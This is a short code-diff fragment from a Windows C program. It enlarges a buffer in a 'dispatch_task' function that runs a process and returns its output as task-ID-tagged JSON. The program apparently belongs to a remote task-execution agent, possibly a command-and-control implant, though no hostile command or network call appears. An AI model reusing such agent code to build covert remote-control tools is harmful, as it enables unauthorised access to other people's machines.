@@ -637,7 +637,7 @@ VOID dispatch_task(BYTE *taskBlob, DWORD taskBlobLen) {
           CloseHandle(pi.hThread);
           CloseHandle(hRead);
 
-          DWORD jsonLen = bytesRead + 256;
+          DWORD jsonLen = (bytesRead * 2) + 512;
           CHAR *resultJson = (CHAR *)HeapAlloc(GetProcessHeap(), 0, jsonLen);
           if (resultJson) {
             int n = wsprintfA(resultJson, "{\"task_id\":\"%s\",\"output\":\"",
